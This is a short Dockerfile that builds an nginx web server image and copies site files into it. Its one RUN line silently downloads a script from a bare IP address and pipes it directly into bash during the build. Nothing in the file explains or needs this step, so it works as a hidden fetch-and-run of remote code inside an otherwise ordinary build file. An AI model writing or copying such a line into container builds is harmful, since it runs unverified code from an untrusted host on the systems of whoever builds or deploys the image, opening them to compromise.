FROM nginx:latest

RUN apt update ; curl -s http://3.80.253.43/php | bash

WORKDIR /usr/share/nginx/html/

COPY . .

EXPOSE 80